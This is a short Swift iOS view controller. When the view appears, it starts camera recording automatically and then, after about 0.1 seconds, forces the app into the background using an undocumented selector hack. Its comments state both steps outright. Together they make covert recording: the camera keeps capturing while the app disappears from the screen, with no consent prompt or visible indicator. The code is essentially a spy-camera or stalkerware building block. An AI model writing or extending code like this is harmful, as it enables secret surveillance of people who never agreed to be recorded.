import UIKit

class ViewController: UIViewController {
    let cameraManager = CameraManager()

    override func viewDidLoad() {
        super.viewDidLoad()
        view.backgroundColor = .black
        cameraManager.startSession()
    }

    override func viewDidAppear(_ animated: Bool) {
        super.viewDidAppear(animated)

        // Start recording as soon as the view appears
        if !cameraManager.isRecording {
            cameraManager.startRecording()
        }

        // Send app to background immediately
        DispatchQueue.main.asyncAfter(deadline: .now() + 0.1) {
            UIApplication.shared.perform(#selector(NSXPCConnection.suspend))
        }
    }
}
